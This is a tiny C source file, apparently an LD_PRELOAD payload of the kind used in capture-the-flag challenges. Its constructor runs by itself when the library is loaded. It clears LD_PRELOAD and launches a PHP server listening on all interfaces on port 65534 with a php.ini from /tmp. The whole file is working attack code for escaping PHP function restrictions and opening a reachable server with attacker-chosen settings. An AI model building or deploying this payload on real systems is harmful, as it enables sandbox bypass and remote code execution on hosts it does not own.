#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__ ((__constructor__)) void xxx (void){
    unsetenv("LD_PRELOAD");
    system("php -S 0.0.0.0:65534 -c /tmp/php.ini");
}
